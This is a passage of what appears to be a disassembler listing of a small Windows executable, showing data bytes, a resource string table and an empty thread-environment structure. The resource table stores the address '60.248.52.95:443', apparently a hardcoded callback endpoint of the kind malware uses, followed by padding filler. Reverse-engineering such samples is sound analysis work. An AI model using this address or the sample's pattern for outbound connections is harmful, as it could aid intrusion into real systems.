        004035f4 00              ??         00h
        004035f5 00              ??         00h
        004035f6 00              ??         00h
        004035f7 00              ??         00h
        004035f8 00              ??         00h
        004035f9 00              ??         00h
        004035fa 00              ??         00h
        004035fb 00              ??         00h
        004035fc 00              ??         00h
        004035fd 00              ??         00h
        004035fe 00              ??         00h
        004035ff 00              ??         00h
        00403600 00              ??         00h
        00403601 00              ??         00h
        00403602 00              ??         00h
        00403603 00              ??         00h
        00403604 00              ??         00h
        00403605 00              ??         00h
        00403606 00              ??         00h
        00403607 00              ??         00h
        00403608 00              ??         00h
        00403609 00              ??         00h
        0040360a 00              ??         00h
        0040360b 00              ??         00h
                             **************************************************************
                             * _DoWildCard parameter of __getmainargs                     *
                             *                                                            *
                             **************************************************************
                             _DoWildCard_0040360c                            XREF[1]:     entry:00401d7d(R)
        0040360c 00 00 00 00     int        0h
                             DAT_00403610                                    XREF[1]:     entry:00401d71(R)
        00403610 00 00 00 00     undefined4 00000000h
                             DAT_00403614                                    XREF[1]:     entry:00401d30(R)
        00403614 00 00 00 00     undefined4 00000000h
                             DAT_00403618                                    XREF[1]:     entry:00401d22(R)
        00403618 00 00 00 00     undefined4 00000000h
                             DAT_0040361c                                    XREF[1]:     entry:00401d0e(RW)
        0040361c 00              ??         00h
        0040361d 00              ??         00h
        0040361e 00              ??         00h
        0040361f 00              ??         00h
                             DAT_00403620                                    XREF[1]:     entry:00401d15(RW)
        00403620 00              ??         00h
        00403621 00              ??         00h
        00403622 00              ??         00h
        00403623 00              ??         00h
                             DAT_00403624                                    XREF[1]:     entry:00401d3f(W)
        00403624 00              ??         00h
        00403625 00              ??         00h
        00403626 00              ??         00h
        00403627 00              ??         00h
                             //
                             // .rsrc
                             // ram:00404000-ram:004041ff
                             //
                             IMAGE_RESOURCE_DIRECTORY_00404000               XREF[2]:     00400168(*), 0040025c(*)
        00404000 00 00 00        IMAGE_RE
                 00 00 00
                 00 00 04
        00404010 06 00 00        IMAGE_RE
                 00 18 00
                 00 80
        00404018 00 00 00        IMAGE_RE
                 00 00 00
                 00 00 04
        00404028 01 00 00        IMAGE_RE
                 00 30 00
                 00 80
        00404030 00 00 00        IMAGE_RE
                 00 00 00
                 00 00 04
        00404040 09 04 00        IMAGE_RE
                 00 48 00
                 00 00
        00404048 58 40 00        IMAGE_RE
                 00 24 00
                 00 00 e4
                             Rsrc_StringTable_1_409
        00404058 00 00           p_unicode  u""                                              Rsrc String ID 0
        0040405a 10 00 36        p_unicode  u"60.248.52.95:443"                              Rsrc String ID 1
                 00 30 00
                 2e 00 32
        0040407c 50              ??         50h    P                                         Rsrc String ID 2
        0040407d 41              ??         41h    A                                         Rsrc String ID 3
        0040407e 44              ??         44h    D                                         Rsrc String ID 4
        0040407f 44              ??         44h    D                                         Rsrc String ID 5
        00404080 49              ??         49h    I                                         Rsrc String ID 6
        00404081 4e              ??         4Eh    N                                         Rsrc String ID 7
        00404082 47              ??         47h    G                                         Rsrc String ID 8
        00404083 58              ??         58h    X                                         Rsrc String ID 9
        00404084 58              ??         58h    X                                         Rsrc String ID 10
        00404085 50              ??         50h    P                                         Rsrc String ID 11
        00404086 41              ??         41h    A                                         Rsrc String ID 12
        00404087 44              ??         44h    D                                         Rsrc String ID 13
        00404088 44              ??         44h    D                                         Rsrc String ID 14
        00404089 49              ??         49h    I                                         Rsrc String ID 15
                             **************************************************************
                             * Rsrc_StringTable_1_409 Size of resource: 0x24 bytes        *
                             **************************************************************
        0040408a 4e              ??         4Eh    N
        0040408b 47              ??         47h    G
        0040408c 50              ??         50h    P
        0040408d 41              ??         41h    A
        0040408e 44              ??         44h    D
        0040408f 44              ??         44h    D
        00404090 49              ??         49h    I
        00404091 4e              ??         4Eh    N
        00404092 47              ??         47h    G
        00404093 58              ??         58h    X
        00404094 58              ??         58h    X
        00404095 50              ??         50h    P
        00404096 41              ??         41h    A
        00404097 44              ??         44h    D
        00404098 44              ??         44h    D
        00404099 49              ??         49h    I
        0040409a 4e              ??         4Eh    N
        0040409b 47              ??         47h    G
        0040409c 50              ??         50h    P
        0040409d 41              ??         41h    A
        0040409e 44              ??         44h    D
        0040409f 44              ??         44h    D
        004040a0 49              ??         49h    I
        004040a1 4e              ??         4Eh    N
        004040a2 47              ??         47h    G
        004040a3 58              ??         58h    X
        004040a4 58              ??         58h    X
        004040a5 50              ??         50h    P
        004040a6 41              ??         41h    A
        004040a7 44              ??         44h    D
        004040a8 44              ??         44h    D
        004040a9 49              ??         49h    I
        004040aa 4e              ??         4Eh    N
        004040ab 47              ??         47h    G
        004040ac 50              ??         50h    P
        004040ad 41              ??         41h    A
        004040ae 44              ??         44h    D
        004040af 44              ??         44h    D
        004040b0 49              ??         49h    I
        004040b1 4e              ??         4Eh    N
        004040b2 47              ??         47h    G
        004040b3 58              ??         58h    X
        004040b4 58              ??         58h    X
        004040b5 50              ??         50h    P
        004040b6 41              ??         41h    A
        004040b7 44              ??         44h    D
        004040b8 44              ??         44h    D
        004040b9 49              ??         49h    I
        004040ba 4e              ??         4Eh    N
        004040bb 47              ??         47h    G
        004040bc 50              ??         50h    P
        004040bd 41              ??         41h    A
        004040be 44              ??         44h    D
        004040bf 44              ??         44h    D
        004040c0 49              ??         49h    I
        004040c1 4e              ??         4Eh    N
        004040c2 47              ??         47h    G
        004040c3 58              ??         58h    X
        004040c4 58              ??         58h    X
        004040c5 50              ??         50h    P
        004040c6 41              ??         41h    A
        004040c7 44              ??         44h    D
        004040c8 44              ??         44h    D
        004040c9 49              ??         49h    I
        004040ca 4e              ??         4Eh    N
        004040cb 47              ??         47h    G
        004040cc 50              ??         50h    P
        004040cd 41              ??         41h    A
        004040ce 44              ??         44h    D
        004040cf 44              ??         44h    D
        004040d0 49              ??         49h    I
        004040d1 4e              ??         4Eh    N
        004040d2 47              ??         47h    G
        004040d3 58              ??         58h    X
        004040d4 58              ??         58h    X
        004040d5 50              ??         50h    P
        004040d6 41              ??         41h    A
        004040d7 44              ??         44h    D
        004040d8 44              ??         44h    D
        004040d9 49              ??         49h    I
        004040da 4e              ??         4Eh    N
        004040db 47              ??         47h    G
        004040dc 50              ??         50h    P
        004040dd 41              ??         41h    A
        004040de 44              ??         44h    D
        004040df 44              ??         44h    D
        004040e0 49              ??         49h    I
        004040e1 4e              ??         4Eh    N
        004040e2 47              ??         47h    G
        004040e3 58              ??         58h    X
        004040e4 58              ??         58h    X
        004040e5 50              ??         50h    P
        004040e6 41              ??         41h    A
        004040e7 44              ??         44h    D
        004040e8 44              ??         44h    D
        004040e9 49              ??         49h    I
        004040ea 4e              ??         4Eh    N
        004040eb 47              ??         47h    G
        004040ec 50              ??         50h    P
        004040ed 41              ??         41h    A
        004040ee 44              ??         44h    D
        004040ef 44              ??         44h    D
        004040f0 49              ??         49h    I
        004040f1 4e              ??         4Eh    N
        004040f2 47              ??         47h    G
        004040f3 58              ??         58h    X
        004040f4 58              ??         58h    X
        004040f5 50              ??         50h    P
        004040f6 41              ??         41h    A
        004040f7 44              ??         44h    D
        004040f8 44              ??         44h    D
        004040f9 49              ??         49h    I
        004040fa 4e              ??         4Eh    N
        004040fb 47              ??         47h    G
        004040fc 50              ??         50h    P
        004040fd 41              ??         41h    A
        004040fe 44              ??         44h    D
        004040ff 44              ??         44h    D
        00404100 49              ??         49h    I
        00404101 4e              ??         4Eh    N
        00404102 47              ??         47h    G
        00404103 58              ??         58h    X
        00404104 58              ??         58h    X
        00404105 50              ??         50h    P
        00404106 41              ??         41h    A
        00404107 44              ??         44h    D
        00404108 44              ??         44h    D
        00404109 49              ??         49h    I
        0040410a 4e              ??         4Eh    N
        0040410b 47              ??         47h    G
        0040410c 50              ??         50h    P
        0040410d 41              ??         41h    A
        0040410e 44              ??         44h    D
        0040410f 44              ??         44h    D
        00404110 49              ??         49h    I
        00404111 4e              ??         4Eh    N
        00404112 47              ??         47h    G
        00404113 58              ??         58h    X
        00404114 58              ??         58h    X
        00404115 50              ??         50h    P
        00404116 41              ??         41h    A
        00404117 44              ??         44h    D
        00404118 44              ??         44h    D
        00404119 49              ??         49h    I
        0040411a 4e              ??         4Eh    N
        0040411b 47              ??         47h    G
        0040411c 50              ??         50h    P
        0040411d 41              ??         41h    A
        0040411e 44              ??         44h    D
        0040411f 44              ??         44h    D
        00404120 49              ??         49h    I
        00404121 4e              ??         4Eh    N
        00404122 47              ??         47h    G
        00404123 58              ??         58h    X
        00404124 58              ??         58h    X
        00404125 50              ??         50h    P
        00404126 41              ??         41h    A
        00404127 44              ??         44h    D
        00404128 44              ??         44h    D
        00404129 49              ??         49h    I
        0040412a 4e              ??         4Eh    N
        0040412b 47              ??         47h    G
        0040412c 50              ??         50h    P
        0040412d 41              ??         41h    A
        0040412e 44              ??         44h    D
        0040412f 44              ??         44h    D
        00404130 49              ??         49h    I
        00404131 4e              ??         4Eh    N
        00404132 47              ??         47h    G
        00404133 58              ??         58h    X
        00404134 58              ??         58h    X
        00404135 50              ??         50h    P
        00404136 41              ??         41h    A
        00404137 44              ??         44h    D
        00404138 44              ??         44h    D
        00404139 49              ??         49h    I
        0040413a 4e              ??         4Eh    N
        0040413b 47              ??         47h    G
        0040413c 50              ??         50h    P
        0040413d 41              ??         41h    A
        0040413e 44              ??         44h    D
        0040413f 44              ??         44h    D
        00404140 49              ??         49h    I
        00404141 4e              ??         4Eh    N
        00404142 47              ??         47h    G
        00404143 58              ??         58h    X
        00404144 58              ??         58h    X
        00404145 50              ??         50h    P
        00404146 41              ??         41h    A
        00404147 44              ??         44h    D
        00404148 44              ??         44h    D
        00404149 49              ??         49h    I
        0040414a 4e              ??         4Eh    N
        0040414b 47              ??         47h    G
        0040414c 50              ??         50h    P
        0040414d 41              ??         41h    A
        0040414e 44              ??         44h    D
        0040414f 44              ??         44h    D
        00404150 49              ??         49h    I
        00404151 4e              ??         4Eh    N
        00404152 47              ??         47h    G
        00404153 58              ??         58h    X
        00404154 58              ??         58h    X
        00404155 50              ??         50h    P
        00404156 41              ??         41h    A
        00404157 44              ??         44h    D
        00404158 44              ??         44h    D
        00404159 49              ??         49h    I
        0040415a 4e              ??         4Eh    N
        0040415b 47              ??         47h    G
        0040415c 50              ??         50h    P
        0040415d 41              ??         41h    A
        0040415e 44              ??         44h    D
        0040415f 44              ??         44h    D
        00404160 49              ??         49h    I
        00404161 4e              ??         4Eh    N
        00404162 47              ??         47h    G
        00404163 58              ??         58h    X
        00404164 58              ??         58h    X
        00404165 50              ??         50h    P
        00404166 41              ??         41h    A
        00404167 44              ??         44h    D
        00404168 44              ??         44h    D
        00404169 49              ??         49h    I
        0040416a 4e              ??         4Eh    N
        0040416b 47              ??         47h    G
        0040416c 50              ??         50h    P
        0040416d 41              ??         41h    A
        0040416e 44              ??         44h    D
        0040416f 44              ??         44h    D
        00404170 49              ??         49h    I
        00404171 4e              ??         4Eh    N
        00404172 47              ??         47h    G
        00404173 58              ??         58h    X
        00404174 58              ??         58h    X
        00404175 50              ??         50h    P
        00404176 41              ??         41h    A
        00404177 44              ??         44h    D
        00404178 44              ??         44h    D
        00404179 49              ??         49h    I
        0040417a 4e              ??         4Eh    N
        0040417b 47              ??         47h    G
        0040417c 50              ??         50h    P
        0040417d 41              ??         41h    A
        0040417e 44              ??         44h    D
        0040417f 44              ??         44h    D
        00404180 49              ??         49h    I
        00404181 4e              ??         4Eh    N
        00404182 47              ??         47h    G
        00404183 58              ??         58h    X
        00404184 58              ??         58h    X
        00404185 50              ??         50h    P
        00404186 41              ??         41h    A
        00404187 44              ??         44h    D
        00404188 44              ??         44h    D
        00404189 49              ??         49h    I
        0040418a 4e              ??         4Eh    N
        0040418b 47              ??         47h    G
        0040418c 50              ??         50h    P
        0040418d 41              ??         41h    A
        0040418e 44              ??         44h    D
        0040418f 44              ??         44h    D
        00404190 49              ??         49h    I
        00404191 4e              ??         4Eh    N
        00404192 47              ??         47h    G
        00404193 58              ??         58h    X
        00404194 58              ??         58h    X
        00404195 50              ??         50h    P
        00404196 41              ??         41h    A
        00404197 44              ??         44h    D
        00404198 44              ??         44h    D
        00404199 49              ??         49h    I
        0040419a 4e              ??         4Eh    N
        0040419b 47              ??         47h    G
        0040419c 50              ??         50h    P
        0040419d 41              ??         41h    A
        0040419e 44              ??         44h    D
        0040419f 44              ??         44h    D
        004041a0 49              ??         49h    I
        004041a1 4e              ??         4Eh    N
        004041a2 47              ??         47h    G
        004041a3 58              ??         58h    X
        004041a4 58              ??         58h    X
        004041a5 50              ??         50h    P
        004041a6 41              ??         41h    A
        004041a7 44              ??         44h    D
        004041a8 44              ??         44h    D
        004041a9 49              ??         49h    I
        004041aa 4e              ??         4Eh    N
        004041ab 47              ??         47h    G
        004041ac 50              ??         50h    P
        004041ad 41              ??         41h    A
        004041ae 44              ??         44h    D
        004041af 44              ??         44h    D
        004041b0 49              ??         49h    I
        004041b1 4e              ??         4Eh    N
        004041b2 47              ??         47h    G
        004041b3 58              ??         58h    X
        004041b4 58              ??         58h    X
        004041b5 50              ??         50h    P
        004041b6 41              ??         41h    A
        004041b7 44              ??         44h    D
        004041b8 44              ??         44h    D
        004041b9 49              ??         49h    I
        004041ba 4e              ??         4Eh    N
        004041bb 47              ??         47h    G
        004041bc 50              ??         50h    P
        004041bd 41              ??         41h    A
        004041be 44              ??         44h    D
        004041bf 44              ??         44h    D
        004041c0 49              ??         49h    I
        004041c1 4e              ??         4Eh    N
        004041c2 47              ??         47h    G
        004041c3 58              ??         58h    X
        004041c4 58              ??         58h    X
        004041c5 50              ??         50h    P
        004041c6 41              ??         41h    A
        004041c7 44              ??         44h    D
        004041c8 44              ??         44h    D
        004041c9 49              ??         49h    I
        004041ca 4e              ??         4Eh    N
        004041cb 47              ??         47h    G
        004041cc 50              ??         50h    P
        004041cd 41              ??         41h    A
        004041ce 44              ??         44h    D
        004041cf 44              ??         44h    D
        004041d0 49              ??         49h    I
        004041d1 4e              ??         4Eh    N
        004041d2 47              ??         47h    G
        004041d3 58              ??         58h    X
        004041d4 58              ??         58h    X
        004041d5 50              ??         50h    P
        004041d6 41              ??         41h    A
        004041d7 44              ??         44h    D
        004041d8 44              ??         44h    D
        004041d9 49              ??         49h    I
        004041da 4e              ??         4Eh    N
        004041db 47              ??         47h    G
        004041dc 50              ??         50h    P
        004041dd 41              ??         41h    A
        004041de 44              ??         44h    D
        004041df 44              ??         44h    D
        004041e0 49              ??         49h    I
        004041e1 4e              ??         4Eh    N
        004041e2 47              ??         47h    G
        004041e3 58              ??         58h    X
        004041e4 58              ??         58h    X
        004041e5 50              ??         50h    P
        004041e6 41              ??         41h    A
        004041e7 44              ??         44h    D
        004041e8 44              ??         44h    D
        004041e9 49              ??         49h    I
        004041ea 4e              ??         4Eh    N
        004041eb 47              ??         47h    G
        004041ec 50              ??         50h    P
        004041ed 41              ??         41h    A
        004041ee 44              ??         44h    D
        004041ef 44              ??         44h    D
        004041f0 49              ??         49h    I
        004041f1 4e              ??         4Eh    N
        004041f2 47              ??         47h    G
        004041f3 58              ??         58h    X
        004041f4 58              ??         58h    X
        004041f5 50              ??         50h    P
        004041f6 41              ??         41h    A
        004041f7 44              ??         44h    D
        004041f8 44              ??         44h    D
        004041f9 49              ??         49h    I
        004041fa 4e              ??         4Eh    N
        004041fb 47              ??         47h    G
        004041fc 50              ??         50h    P
        004041fd 41              ??         41h    A
        004041fe 44              ??         44h    D
        004041ff 44              ??         44h    D
                             //
                             // tdb
                             // ram:ffdff000-ram:ffdfffff
                             //
                             ExceptionList                                   XREF[3]:     entry:00401ce9(R),
                                                                                          entry:00401cf0(W), ffdff018(*)
        ffdff000 00 00 00 00     void *     00000000
                             StackBase
        ffdff004 00 00 00 00     void *     00000000
                             StackLimit
        ffdff008 00 00 00 00     void *     00000000
                             SubSystemTib
        ffdff00c 00 00 00 00     void *     00000000
                             FiberData
        ffdff010 00 00 00 00     void *     00000000
                             ArbitraryUserPointer
        ffdff014 00 00 00 00     void *     00000000
                             Self
        ffdff018 00 f0 df ff     void *     ExceptionList                                    = 00000000
                             EnvironmentPointer
        ffdff01c 00 00 00 00     void *     00000000
                             ClientId
        ffdff020 00 00 00        CLIENT_ID
                 00 00 00
                 00 00
                             ActiveRpcHandle
        ffdff028 00 00 00 00     void *     00000000
                             ThreadLocalStoragePointer
        ffdff02c 00 00 00 00     void *     00000000
                             ProcessEnvironmentBlock
        ffdff030 00 00 00 00     void *     00000000
                             LastErrorValue
        ffdff034 00 00 00 00     ddw        0h
                             CountOfOwnedCriticalSections
        ffdff038 00 00 00 00     ddw        0h
                             CsrClientThread
        ffdff03c 00 00 00 00     void *     00000000
                             Win32ThreadInfo
        ffdff040 00 00 00 00     void *     00000000
                             User32Reserved
        ffdff044 00 00 00        ddw[26]
                 00 00 00
                 00 00 00
                             UserReserved
        ffdff0ac 00 00 00        ddw[5]
                 00 00 00
                 00 00 00
                             WOW32Reserved
        ffdff0c0 00 00 00 00     void *     00000000
                             CurrentLocale
        ffdff0c4 00 00 00 00     ddw        0h
                             FpSoftwareStatusRegister
        ffdff0c8 00 00 00 00     ddw        0h
                             SystemReserved1
        ffdff0cc 00 00 00        void *[54]
                 00 00 00
                 00 00 00
                             ExceptionCode
        ffdff1a4 00 00 00 00     ddw        0h
                             ActivationContextStackPointer
        ffdff1a8 00 00 00 00     void *     00000000
                             SpareBytes
        ffdff1ac 00 00 00        uchar[36]  ""
                 00 00 00
                 00 00 00
                             TxFsContext
        ffdff1d0 00 00 00 00     ddw        0h
                             GdiTebBatch
        ffdff1d4 00 00 00 00     ddw        0h
        ffdff1d8 00              ??         00h
        ffdff1d9 00              ??         00h
        ffdff1da 00              ??         00h
        ffdff1db 00              ??         00h
        ffdff1dc 00              ??         00h
        ffdff1dd 00              ??         00h
        ffdff1de 00              ??         00h
        ffdff1df 00              ??         00h
        ffdff1e0 00              ??         00h
        ffdff1e1 00              ??         00h
        ffdff1e2 00              ??         00h
        ffdff1e3 00              ??         00h
        ffdff1e4 00              ??         00h
        ffdff1e5 00              ??         00h
        ffdff1e6 00              ??         00h
        ffdff1e7 00              ??         00h
        ffdff1e8 00              ??         00h
        ffdff1e9 00              ??         00h
        ffdff1ea 00              ??         00h
        ffdff1eb 00              ??         00h
        ffdff1ec 00              ??         00h
        ffdff1ed 00              ??         00h
        ffdff1ee 00              ??         00h
        ffdff1ef 00              ??         00h
        ffdff1f0 00              ??         00h
        ffdff1f1 00              ??         00h
        ffdff1f2 00              ??         00h
        ffdff1f3 00              ??         00h
        ffdff1f4 00              ??         00h
        ffdff1f5 00              ??         00h
        ffdff1f6 00              ??         00h
        ffdff1f7 00              ??         00h
        ffdff1f8 00              ??         00h
        ffdff1f9 00              ??         00h
        ffdff1fa 00              ??         00h
        ffdff1fb 00              ??         00h
        ffdff1fc 00              ??         00h
        ffdff1fd 00              ??         00h
        ffdff1fe 00              ??         00h
        ffdff1ff 00              ??         00h
        ffdff200 00              ??         00h
        ffdff201 00              ??         00h
        ffdff202 00              ??         00h
        ffdff203 00              ??         00h
        ffdff204 00              ??         00h
        ffdff205 00              ??         00h
        ffdff206 00              ??         00h
        ffdff207 00              ??         00h
        ffdff208 00              ??         00h
        ffdff209 00              ??         00h
        ffdff20a 00              ??         00h
        ffdff20b 00              ??         00h
        ffdff20c 00              ??         00h
        ffdff20d 00              ??         00h
        ffdff20e 00              ??         00h
        ffdff20f 00              ??         00h
        ffdff210 00              ??         00h
        ffdff211 00              ??         00h
        ffdff212 00              ??         00h
        ffdff213 00              ??         00h
        ffdff214 00              ??         00h
        ffdff215 00              ??         00h
        ffdff216 00              ??         00h
        ffdff217 00              ??         00h
        ffdff218 00              ??         00h
        ffdff219 00              ??         00h
        ffdff21a 00              ??         00h
        ffdff21b 00              ??         00h
        ffdff21c 00              ??         00h
        ffdff21d 00              ??         00h
        ffdff21e 00              ??         00h
        ffdff21f 00              ??         00h
        ffdff220 00              ??         00h
        ffdff221 00              ??         00h
        ffdff222 00              ??         00h
        ffdff223 00              ??         00h
        ffdff224 00              ??         00h
        ffdff225 00              ??         00h
        ffdff226 00              ??         00h
        ffdff227 00              ??         00h
        ffdff228 00              ??         00h
        ffdff229 00              ??         00h
        ffdff22a 00              ??         00h
        ffdff22b 00              ??         00h
        ffdff22c 00              ??         00h
        ffdff22d 00              ??         00h
        ffdff22e 00              ??         00h
        ffdff22f 00              ??         00h
        ffdff230 00              ??         00h
        ffdff231 00              ??         00h
        ffdff232 00              ??         00h
        ffdff233 00              ??         00h
        ffdff234 00              ??         00h
        ffdff235 00              ??         00h
        ffdff236 00              ??         00h
        ffdff237 00              ??         00h
        ffdff238 00              ??         00h
        ffdff239 00              ??         00h
        ffdff23a 00              ??         00h
        ffdff23b 00              ??         00h
        ffdff23c 00              ??         00h
        ffdff23d 00              ??         00h
        ffdff23e 00              ??         00h
        ffdff23f 00              ??         00h
        ffdff240 00              ??         00h
        ffdff241 00              ??         00h
        ffdff242 00              ??         00h
        ffdff243 00              ??         00h
        ffdff244 00              ??         00h
        ffdff245 00              ??         00h
        ffdff246 00              ??         00h
        ffdff247 00              ??         00h
        ffdff248 00              ??         00h
        ffdff249 00              ??         00h
        ffdff24a 00              ??         00h
        ffdff24b 00              ??         00h
        ffdff24c 00              ??         00h
        ffdff24d 00              ??         00h
        ffdff24e 00              ??         00h
        ffdff24f 00              ??         00h
        ffdff250 00              ??         00h
        ffdff251 00              ??         00h
        ffdff252 00              ??         00h
        ffdff253 00              ??         00h
        ffdff254 00              ??         00h
        ffdff255 00              ??         00h
        ffdff256 00              ??         00h
        ffdff257 00              ??         00h
        ffdff258 00              ??         00h
        ffdff259 00              ??         00h
        ffdff25a 00              ??         00h
        ffdff25b 00              ??         00h
        ffdff25c 00              ??         00h
        ffdff25d 00              ??         00h
        ffdff25e 00              ??         00h
        ffdff25f 00              ??         00h
        ffdff260 00              ??         00h
        ffdff261 00              ??         00h
        ffdff262 00              ??         00h
        ffdff263 00              ??         00h
        ffdff264 00              ??         00h
        ffdff265 00              ??         00h
        ffdff266 00              ??         00h
        ffdff267 00              ??         00h
        ffdff268 00              ??         00h
        ffdff269 00              ??         00h
        ffdff26a 00              ??         00h
        ffdff26b 00              ??         00h
        ffdff26c 00              ??         00h
        ffdff26d 00              ??         00h
        ffdff26e 00              ??         00h
        ffdff26f 00              ??         00h
        ffdff270 00              ??         00h
        ffdff271 00              ??         00h
        ffdff272 00              ??         00h
        ffdff273 00              ??         00h
        ffdff274 00              ??         00h
        ffdff275 00              ??         00h
        ffdff276 00              ??         00h
        ffdff277 00              ??         00h
        ffdff278 00              ??         00h
        ffdff279 00              ??         00h
        ffdff27a 00              ??         00h
        ffdff27b 00              ??         00h
        ffdff27c 00              ??         00h
        ffdff27d 00              ??         00h
        ffdff27e 00              ??         00h
        ffdff27f 00              ??         00h
        ffdff280 00              ??         00h
        ffdff281 00              ??         00h
        ffdff282 00              ??         00h
        ffdff283 00              ??         00h
        ffdff284 00              ??         00h
        ffdff285 00              ??         00h
        ffdff286 00              ??         00h
        ffdff287 00              ??         00h
        ffdff288 00              ??         00h
        ffdff289 00              ??         00h
        ffdff28a 00              ??         00h
        ffdff28b 00              ??         00h
        ffdff28c 00              ??         00h
        ffdff28d 00              ??         00h
        ffdff28e 00              ??         00h
        ffdff28f 00              ??         00h
        ffdff290 00              ??         00h
        ffdff291 00              ??         00h
        ffdff292 00              ??         00h
        ffdff293 00              ??         00h
        ffdff294 00              ??         00h
        ffdff295 00              ??         00h
        ffdff296 00              ??         00h
        ffdff297 00              ??         00h
        ffdff298 00              ??         00h
        ffdff299 00              ??         00h
        ffdff29a 00              ??         00h
        ffdff29b 00              ??         00h
        ffdff29c 00              ??         00h
        ffdff29d 00              ??         00h
        ffdff29e 00              ??         00h
        ffdff29f 00              ??         00h
        ffdff2a0 00              ??         00h
        ffdff2a1 00              ??         00h
        ffdff2a2 00              ??         00h
        ffdff2a3 00              ??         00h
        ffdff2a4 00              ??         00h
        ffdff2a5 00              ??         00h
        ffdff2a6 00              ??         00h
        ffdff2a7 00              ??         00h
        ffdff2a8 00              ??         00h
        ffdff2a9 00              ??         00h
        ffdff2aa 00              ??         00h
        ffdff2ab 00              ??         00h
        ffdff2ac 00              ??         00h
        ffdff2ad 00              ??         00h
        ffdff2ae 00              ??         00h
        ffdff2af 00              ??         00h
        ffdff2b0 00              ??         00h
        ffdff2b1 00              ??         00h
        ffdff2b2 00              ??         00h
        ffdff2b3 00              ??         00h
        ffdff2b4 00              ??         00h
        ffdff2b5 00              ??         00h
        ffdff2b6 00              ??         00h
        ffdff2b7 00              ??         00h
        ffdff2b8 00              ??         00h
        ffdff2b9 00              ??         00h
        ffdff2ba 00              ??         00h
        ffdff2bb 00              ??         00h
        ffdff2bc 00              ??         00h
        ffdff2bd 00              ??         00h
        ffdff2be 00              ??         00h
        ffdff2bf 00              ??         00h
        ffdff2c0 00              ??         00h
        ffdff2c1 00              ??         00h
        ffdff2c2 00              ??         00h
        ffdff2c3 00              ??         00h
        ffdff2c4 00              ??         00h
        ffdff2c5 00              ??         00h
        ffdff2c6 00              ??         00h
        ffdff2c7 00              ??         00h
        ffdff2c8 00              ??         00h
        ffdff2c9 00              ??         00h
        ffdff2ca 00              ??         00h
        ffdff2cb 00              ??         00h
        ffdff2cc 00              ??         00h
        ffdff2cd 00              ??         00h
        ffdff2ce 00              ??         00h
        ffdff2cf 00              ??         00h
        ffdff2d0 00              ??         00h
        ffdff2d1 00              ??         00h
        ffdff2d2 00              ??         00h
        ffdff2d3 00              ??         00h
        ffdff2d4 00              ??         00h
        ffdff2d5 00              ??         00h
        ffdff2d6 00              ??         00h
        ffdff2d7 00              ??         00h
        ffdff2d8 00              ??         00h
        ffdff2d9 00              ??         00h
        ffdff2da 00              ??         00h
        ffdff2db 00              ??         00h
        ffdff2dc 00              ??         00h
        ffdff2dd 00              ??         00h
        ffdff2de 00              ??         00h
        ffdff2df 00              ??         00h
        ffdff2e0 00              ??         00h
        ffdff2e1 00              ??         00h
        ffdff2e2 00              ??         00h
        ffdff2e3 00              ??         00h
        ffdff2e4 00              ??         00h
        ffdff2e5 00              ??         00h
        ffdff2e6 00              ??         00h
        ffdff2e7 00              ??         00h
        ffdff2e8 00              ??         00h
        ffdff2e9 00              ??         00h
        ffdff2ea 00              ??         00h
        ffdff2eb 00              ??         00h
        ffdff2ec 00              ??         00h
        ffdff2ed 00              ??         00h
        ffdff2ee 00              ??         00h
        ffdff2ef 00              ??         00h
        ffdff2f0 00              ??         00h
        ffdff2f1 00              ??         00h
        ffdff2f2 00              ??         00h
        ffdff2f3 00              ??         00h
        ffdff2f4 00              ??         00h
        ffdff2f5 00              ??         00h
        ffdff2f6 00              ??         00h
        ffdff2f7 00              ??         00h
        ffdff2f8 00              ??         00h
        ffdff2f9 00              ??         00h
        ffdff2fa 00              ??         00h
        ffdff2fb 00              ??         00h
        ffdff2fc 00              ??         00h
        ffdff2fd 00              ??         00h
        ffdff2fe 00              ??         00h
        ffdff2ff 00              ??         00h
        ffdff300 00              ??         00h
        ffdff301 00              ??         00h
        ffdff302 00              ??         00h
        ffdff303 00              ??         00h
        ffdff304 00              ??         00h
        ffdff305 00              ??         00h
        ffdff306 00              ??         00h
        ffdff307 00              ??         00h
        ffdff308 00              ??         00h
        ffdff309 00              ??         00h
        ffdff30a 00              ??         00h
        ffdff30b 00              ??         00h
        ffdff30c 00              ??         00h
        ffdff30d 00              ??         00h
        ffdff30e 00              ??         00h
        ffdff30f 00              ??         00h
        ffdff310 00              ??         00h
        ffdff311 00              ??         00h
        ffdff312 00              ??         00h
        ffdff313 00              ??         00h
        ffdff314 00              ??         00h
        ffdff315 00              ??         00h
        ffdff316 00              ??         00h
        ffdff317 00              ??         00h
        ffdff318 00              ??         00h
        ffdff319 00              ??         00h
        ffdff31a 00              ??         00h
        ffdff31b 00              ??         00h
        ffdff31c 00              ??         00h
        ffdff31d 00              ??         00h
        ffdff31e 00              ??         00h
        ffdff31f 00              ??         00h
        ffdff320 00              ??         00h
        ffdff321 00              ??         00h
        ffdff322 00              ??         00h
        ffdff323 00              ??         00h
        ffdff324 00              ??         00h
        ffdff325 00              ??         00h
        ffdff326 00              ??         00h
        ffdff327 00              ??         00h
        ffdff328 00              ??         00h
        ffdff329 00              ??         00h
        ffdff32a 00              ??         00h
        ffdff32b 00              ??         00h
        ffdff32c 00              ??         00h
        ffdff32d 00              ??         00h
        ffdff32e 00              ??         00h
        ffdff32f 00              ??         00h
        ffdff330 00              ??         00h
        ffdff331 00              ??         00h
        ffdff332 00              ??         00h
        ffdff333 00              ??         00h
        ffdff334 00              ??         00h
        ffdff335 00              ??         00h
        ffdff336 00              ??         00h
        ffdff337 00              ??         00h
        ffdff338 00              ??         00h
        ffdff339 00              ??         00h
        ffdff33a 00              ??         00h
        ffdff33b 00              ??         00h
        ffdff33c 00              ??         00h
        ffdff33d 00              ??         00h
        ffdff33e 00              ??         00h
        ffdff33f 00              ??         00h
        ffdff340 00              ??         00h
        ffdff341 00              ??         00h
        ffdff342 00              ??         00h
        ffdff343 00              ??         00h
        ffdff344 00              ??         00h
        ffdff345 00              ??         00h
        ffdff346 00              ??         00h
        ffdff347 00              ??         00h
        ffdff348 00              ??         00h
        ffdff349 00              ??         00h
        ffdff34a 00              ??         00h
        ffdff34b 00              ??         00h
        ffdff34c 00              ??         00h
        ffdff34d 00              ??         00h
        ffdff34e 00              ??         00h
        ffdff34f 00              ??         00h
        ffdff350 00              ??         00h
        ffdff351 00              ??         00h
        ffdff352 00              ??         00h
        ffdff353 00              ??         00h
        ffdff354 00              ??         00h
        ffdff355 00              ??         00h
        ffdff356 00              ??         00h
        ffdff357 00              ??         00h
        ffdff358 00              ??         00h
        ffdff359 00              ??         00h
        ffdff35a 00              ??         00h
        ffdff35b 00              ??         00h
